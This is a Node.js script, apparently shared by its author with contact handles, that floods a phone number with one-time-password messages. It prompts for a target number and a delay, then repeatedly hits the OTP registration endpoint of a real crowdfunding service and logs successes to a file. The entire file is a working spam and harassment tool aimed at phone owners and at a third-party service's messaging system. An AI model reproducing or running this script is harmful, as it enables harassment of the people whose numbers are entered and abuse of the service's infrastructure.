/**
  * created by ibnusyawall
  * name : spam-wa
  * wa   : 082299265151
**/

const request = require('needle')
const readline= require('readline')
const fs      = require('fs')
const colors  = require('colors')
const dateFormat = require('date-format')

const tanya = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})

var date_ = dateFormat(new Date(), 'm-d-Y h:i:s');

var i = 1

console.log(`\n    [ SPAM OTP wa KITABISA by STech ] \n `)
console.log(' FB : '+'@'.red+'ibnusyawal00'+' | Git : '+'@'.blue+'ibnusyawall\n')

tanya.question('['+'?'.magenta+'] Nomor : ', (_no_) => {
  tanya.question('['+'?'.magenta+'] Delay : ', (_de_) => {
    const main = (nomor, delay) => {
      setTimeout(() => {
        request(`https://core.ktbs.io/v2/user/registration/otp/${nomor}`, (error, response, body) => {
          if (toString(body).match(/errors/gi)) {
            console.log('['+'×'.red+'] Tunggu Gan .. ')
          } else {
            console.log('  -- ['+'√'.green+`] Sukses : ${nomor} [ delay : ${_de_}`+'s '.cyan+`]`)
            fs.appendFile('./result.txt', `${nomor} : ${date_} \n`, function(err) {
             if (err) throw err;
               //console.log(' [√] success saved on result.txt')
             })
          }
        })
        i++
        if (i <= delay) {
          main(nomor, delay)
        }
      }, delay)
    }
    return main(_no_, `${_de_}000`)
  })
})

